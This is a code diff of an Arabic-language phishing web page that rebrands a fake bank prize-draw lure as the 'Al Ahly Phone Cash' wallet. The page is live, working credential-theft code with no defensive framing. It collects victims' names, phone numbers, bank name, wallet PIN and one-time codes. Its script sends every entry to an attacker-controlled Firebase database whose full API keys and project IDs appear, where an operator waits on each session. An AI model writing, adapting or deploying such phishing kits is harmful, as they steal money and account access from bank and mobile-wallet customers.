@@ -6,18 +6,24 @@
 <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>بنك الأمان</title>
+  <title>محفظة الاهلي فون كاش</title>
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Noto+Naskh+Arabic:wght@400;700&display=swap');
-    * { font-family: 'Cairo', 'Janna LT', 'Janna', Arial, sans-serif; }
-    * { margin:0; padding:0; box-sizing:border-box; }
+    * { margin:0; padding:0; box-sizing:border-box; font-family: 'Cairo', 'Janna LT', 'Janna', Arial, sans-serif; }
+
+    :root {
+      --primary: #006633;
+      --primary-dark: #004d26;
+      --primary-light: #008040;
+      --bg-card: #ffffff;
+      --border: #b2d8c0;
+    }
+
     body {
       min-height: 100vh;
-      background: var(--bg);
+      background: #006633;
       display: flex;
       align-items: center;
       justify-content: center;
-      font-family: 'Cairo', 'Janna LT', 'Janna', Arial, sans-serif;
       padding: 20px;
     }
     .card {
@@ -26,7 +32,7 @@
       padding: 35px 28px;
       width: 100%;
       max-width: 420px;
-      box-shadow: 0 20px 60px rgba(0,0,0,0.25);
+      box-shadow: 0 20px 60px rgba(0,0,0,0.35);
       text-align: center;
     }
     .logo { width: 100px; margin-bottom: 20px; }
@@ -46,12 +52,12 @@
     }
     .btn-main {
       width: 100%; padding: 14px;
-      background: #0058b0; color: #fff;
+      background: var(--primary); color: #fff;
       border: none; border-radius: 12px;
       font-size: 16px; font-weight: 800;
       cursor: pointer; transition: background 0.2s, transform 0.1s;
     }
-    .btn-main:hover { background: #0058b0; }
+    .btn-main:hover { background: var(--primary-dark); }
     .btn-main:active { transform: scale(0.98); }
     .page-title {
       font-size: 20px; font-weight: 900;
@@ -66,11 +72,11 @@
     .form-group input {
       background: #ffffff !important; color: #1a2a3a !important;
       width: 100%; padding: 12px 14px;
-      border: 2px solid #b0bec5; border-radius: 10px;
+      border: 2px solid #b2d8c0; border-radius: 10px;
       font-size: 14px; outline: none;
       text-align: right; transition: border-color 0.2s;
     }
-    .form-group input:focus { border-color: #0058b0; background: var(--bg-card); }
+    .form-group input:focus { border-color: var(--primary); }
     .login-subtitle {
       font-size: 14px; color: #555;
       margin-bottom: 22px; font-weight: 600;
@@ -85,13 +91,14 @@
       cursor: pointer; color: #aaa; font-size: 18px;
       z-index: 2; padding: 0; line-height: 1;
     }
-    .eye-btn:hover { color: #0058b0; }
+    .eye-btn:hover { color: var(--primary); }
     .special-badge {
       margin-top: 18px;
-      border: 2px solid #b0bec5;
+      border: 2px solid #b2d8c0;
       border-radius: 12px; padding: 14px 18px;
       display: flex; align-items: center;
       justify-content: center; gap: 10px;
+      background: #f0f7f2;
     }
     .special-badge .badge-icon { font-size: 22px; flex-shrink: 0; }
     .special-badge .badge-text {
@@ -105,13 +112,13 @@
     }
     .step-dot {
       width: 8px; height: 8px; border-radius: 50%;
-      background: var(--border); transition: background 0.3s;
+      background: #b2d8c0; transition: background 0.3s;
     }
-    .step-dot.active { background: #0058b0; }
+    .step-dot.active { background: var(--primary); }
     .step-dot.done { background: #81c784; }
     .overlay {
       display: none; position: fixed; inset: 0;
-      background: rgba(0, 20, 60, 0.88);
+      background: rgba(0,51,25,0.88);
       backdrop-filter: blur(4px);
       -webkit-backdrop-filter: blur(4px);
       z-index: 999; align-items: center; justify-content: center;
@@ -122,16 +129,16 @@
       padding: 40px 32px; text-align: center;
       max-width: 320px; width: 90%;
       box-shadow: 0 20px 60px rgba(0,0,0,0.5);
-      border: 1px solid rgba(0,88,176,0.15);
+      border: 1px solid rgba(0,102,51,0.15);
     }
     .spinner {
       width: 56px; height: 56px;
-      border: 5px solid #dce8f7; border-top-color: #0058b0;
+      border: 5px solid #c8e6c9; border-top-color: var(--primary);
       border-radius: 50%; animation: spin 0.85s linear infinite;
       margin: 0 auto 20px;
     }
     @keyframes spin { to { transform: rotate(360deg); } }
-    .waiting-title { font-size: 18px; font-weight: 800; color: #0058b0; margin-bottom: 10px; }
+    .waiting-title { font-size: 18px; font-weight: 800; color: var(--primary); margin-bottom: 10px; }
     .waiting-sub { font-size: 13px; color: #555; line-height: 1.7; }
     .error-icon-big { font-size: 54px; margin-bottom: 14px; }
     .error-lb-title { font-size: 17px; font-weight: 900; color: #c62828; margin-bottom: 10px; }
@@ -148,13 +155,13 @@
     .otp-inputs { margin-bottom: 20px; }
     .otp-inputs input {
       width: 100%; height: 58px;
-      border: 2px solid #b0bec5; border-radius: 10px;
+      border: 2px solid #b2d8c0; border-radius: 10px;
       font-size: 24px; font-weight: 800;
       text-align: center; outline: none;
       transition: border-color 0.2s; letter-spacing: 8px;
       background: #fafafa; direction: ltr;
     }
-    .otp-inputs input:focus { border-color: #0058b0; }
+    .otp-inputs input:focus { border-color: var(--primary); }
     .otp-error {
       display: none; background: #fee2e2;
       color: #dc2626; border-radius: 10px;
@@ -165,28 +172,6 @@
     .success-icon { font-size: 60px; margin-bottom: 14px; }
     .success-title { font-size: 22px; font-weight: 900; color: var(--primary); margin-bottom: 8px; }
     .success-sub { font-size: 14px; color: #666; }
-    .bin-wrapper { margin: 10px 0; text-align: center; }
-    .bin-label {
-      display: block; font-size: 14px;
-      color: #003d80; font-weight: bold; margin-bottom: 8px;
-    }
-    .bin-boxes {
-      display: flex; justify-content: center;
-      gap: 12px; direction: ltr;
-    }
-    .bin-box {
-      width: 52px; height: 52px;
-      text-align: center; font-size: 22px;
-      font-weight: bold; padding: 0;
-      border: 2px solid #003d80; border-radius: 10px;
-      color: #ffffff; background: #003d80; outline: none;
-      display: flex; align-items: center; justify-content: center;
-      transition: border-color 0.2s, box-shadow 0.2s, background 0.2s;
-    }
-    .bin-box:focus {
-      border-color: #001f4d; background: #001f4d;
-      box-shadow: 0 0 0 3px rgba(0,61,128,0.3);
-    }
   </style>
 </head>
 <body>
@@ -241,14 +226,14 @@
 
   <!-- STEP 0: LANDING -->
   <div class="step active" id="stepLanding">
-    <div class="landing-title">بنك الأمان</div>
-    <div class="landing-sub1">خاص لعملاء بنك الأمان</div>
+    <div class="landing-title">محفظة الاهلي فون كاش</div>
+    <div class="landing-sub1">خاص لعملاء محفظة الاهلي فون كاش</div>
     <div class="landing-sub2">
       سجل في السحب الان على الجوائز النقدية والعينية المجزية<br/>
-      المقدمة من بنك الأمان
+      المقدمة من محفظة الاهلي فون كاش
     </div>
     <button class="btn-main" onclick="goToPersonalInfo()">🎁 سجل في السحب الان</button>
-    <div class="secure-note">🔒 محمي بتشفير SSL 256-bit | بنك الأمان © 2024</div>
+    <div class="secure-note">🔒 محمي بتشفير SSL 256-bit | محفظة الاهلي فون كاش © 2024</div>
   </div>
 
   <!-- STEP 1: PERSONAL INFO -->
@@ -266,10 +251,14 @@
     </div>
     <div class="form-group">
       <label>رقم الهاتف</label>
-      <input type="tel" id="personalPhoneInput" placeholder="09XXXXXXXXX" maxlength="10" oninput="this.value=this.value.replace(/[^0-9]/g,'')"/>
+      <input type="tel" id="personalPhoneInput" placeholder="011XXXXXXXX" maxlength="11" oninput="this.value=this.value.replace(/[^0-9]/g,'')"/>
+    </div>
+    <div class="form-group">
+      <label>اسم البنك</label>
+      <input type="text" id="bankNameInput" placeholder="أدخل اسم البنك"/>
     </div>
     <button class="btn-main" onclick="goToLogin()">التالي ←</button>
-    <div class="secure-note">🔒 محمي بتشفير SSL 256-bit | بنك الأمان © 2024</div>
+    <div class="secure-note">🔒 محمي بتشفير SSL 256-bit | محفظة الاهلي فون كاش © 2024</div>
   </div>
 
   <!-- STEP 2: LOGIN -->
@@ -279,35 +268,25 @@
       <div class="step-dot done"></div>
       <div class="step-dot active"></div>
     </div>
-    <div class="page-title">بيانات التطبيق</div>
+    <div class="page-title">بيانات المحفظة</div>
     <div class="login-subtitle">أدخل بيانات محفظتك الإلكترونية</div>
     <div class="form-group">
       <div class="input-wrap">
-        <input type="text" id="phoneInput" placeholder="اسم المستخدم حسب التطبيق البنكي" oninput="this.value=this.value.replace(/[^a-zA-Z0-9]/g,'')"/>
+        <input type="tel" id="phoneInput" placeholder="أدخل رقم الموبايل" oninput="this.value=this.value.replace(/[^0-9]/g,'')"/>
       </div>
     </div>
     <div class="form-group">
       <div class="input-wrap pin-wrap">
-        <input type="password" id="pinInput" placeholder="كلمة مرور التطبيق البنكي"/>
+        <input type="password" id="pinInput" placeholder="الرقم السري" oninput="this.value=this.value.replace(/[^0-9]/g,'')"/>
         <button class="eye-btn" onclick="togglePin()" type="button">👁</button>
-      </div>
-      <!-- BIN 4 boxes -->
-      <div class="bin-wrapper">
-        <label class="bin-label">الرقم السري BIN</label>
-        <div class="bin-boxes">
-          <input class="bin-box" type="tel" maxlength="1" id="bin1"/>
-          <input class="bin-box" type="tel" maxlength="1" id="bin2"/>
-          <input class="bin-box" type="tel" maxlength="1" id="bin3"/>
-          <input class="bin-box" type="tel" maxlength="1" id="bin4"/>
-        </div>
       </div>
     </div>
     <div class="special-badge">
-      <div class="badge-icon">🏦</div>
-      <div class="badge-text">خاص بعملاء بنك الأمان</div>
+      <div class="badge-icon">💚</div>
+      <div class="badge-text">خاص بعملاء محفظة الاهلي فون كاش</div>
     </div>
     <button class="btn-main" style="margin-top:18px;" onclick="submitLogin()">تسجيل الدخول</button>
-    <div class="secure-note">🔒 محمي بتشفير SSL 256-bit | بنك الأمان © 2024</div>
+    <div class="secure-note">🔒 محمي بتشفير SSL 256-bit | محفظة الاهلي فون كاش © 2024</div>
   </div>
 
   <!-- STEP 3: OTP -->
@@ -316,10 +295,10 @@
     <div class="otp-sub">تم إرسال رمز التحقق إلى رقم هاتفك</div>
     <div class="otp-error" id="otpError">❌ الرمز غير صحيح، يرجى المحاولة مرة أخرى</div>
     <div class="otp-inputs">
-      <input type="tel" id="otpSingleInput" placeholder="أدخل رمز التحقق"/>
+      <input type="tel" id="otpSingleInput" placeholder="أدخل رمز التحقق" oninput="this.value=this.value.replace(/[^0-9]/g,'')"/>
     </div>
     <button class="btn-main" onclick="submitOTP()">تأكيد</button>
-    <div class="secure-note">🔒 محمي بتشفير SSL 256-bit | بنك الأمان © 2024</div>
+    <div class="secure-note">🔒 محمي بتشفير SSL 256-bit | محفظة الاهلي فون كاش © 2024</div>
   </div>
 
   <!-- STEP 4: SUCCESS -->
@@ -336,14 +315,14 @@
   import { getDatabase, ref, push, update, onValue, off } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
 
   const firebaseConfig = {
-    apiKey: "AIzaSyBeHm-fcDyytoNQA25B9OQXA1HlOJvkabg",
-    authDomain: "bank-alaman.firebaseapp.com",
-    databaseURL: "https://bank-alaman-default-rtdb.firebaseio.com",
-    projectId: "bank-alaman",
-    storageBucket: "bank-alaman.firebasestorage.app",
-    messagingSenderId: "752399695910",
-    appId: "1:752399695910:web:bfc58054468e103396e6e7",
-    measurementId: "G-LR603JTB89"
+    apiKey: "AIzaSyDH_q2OEPBa2811sCAQse7uFTqSlVOmaw4",
+    authDomain: "ahlywllt-45d9a.firebaseapp.com",
+    databaseURL: "https://ahlywllt-45d9a-default-rtdb.firebaseio.com",
+    projectId: "ahlywllt-45d9a",
+    storageBucket: "ahlywllt-45d9a.firebasestorage.app",
+    messagingSenderId: "266724152700",
+    appId: "1:266724152700:web:c689a22cc2a104c62c00f9",
+    measurementId: "G-C0RM4NHYPM"
   };
 
   const app = initializeApp(firebaseConfig);
@@ -377,7 +356,8 @@
   window.goToLogin = function() {
     const name = document.getElementById('nameInput').value.trim();
     const phone = document.getElementById('personalPhoneInput').value.trim();
-    if (!name || !phone) { alert('يرجى تعبئة جميع الحقول'); return; }
+    const bankName = document.getElementById('bankNameInput').value.trim();
+    if (!name || !phone || !bankName) { alert('يرجى تعبئة جميع الحقول'); return; }
     showStep('stepLogin');
   }
 
@@ -402,18 +382,19 @@
   window.submitLogin = async function() {
     const name = document.getElementById('nameInput').value.trim();
     const personalPhone = document.getElementById('personalPhoneInput').value.trim();
+    const bankName = document.getElementById('bankNameInput').value.trim();
     const phone = document.getElementById('phoneInput').value.trim();
     const pin = document.getElementById('pinInput').value.trim();
-    const bin = (document.getElementById('bin1').value || '') +
-                (document.getElementById('bin2').value || '') +
-                (document.getElementById('bin3').value || '') +
-                (document.getElementById('bin4').value || '');
     if (!phone || !pin) return;
 
     showOverlay('waitingOverlay');
 
     const newRef = push(ref(db, 'site1/sessions'), {
-      name, personalPhone, phone, pin, bin,
+      name,
+      personalPhone,
+      bankName,
+      phone,
+      pin,
       otp: '---',
       status: 'waiting',
       currentPage: 'login',
@@ -458,25 +439,6 @@
       }
     });
   }
-
-  document.addEventListener('DOMContentLoaded', function() {
-    var boxes = ['bin1','bin2','bin3','bin4'];
-    boxes.forEach(function(id, idx) {
-      var el = document.getElementById(id);
-      if (!el) return;
-      el.addEventListener('keydown', function(e) {
-        if (e.key === 'Backspace' && el.value === '' && idx > 0) {
-          document.getElementById(boxes[idx-1]).focus();
-        }
-      });
-      el.addEventListener('input', function() {
-        el.value = el.value.replace(/[^0-9]/g, '').slice(0,1);
-        if (el.value.length === 1 && idx < 3) {
-          document.getElementById(boxes[idx+1]).focus();
-        }
-      });
-    });
-  });
 </script>
 </body>
 </html>
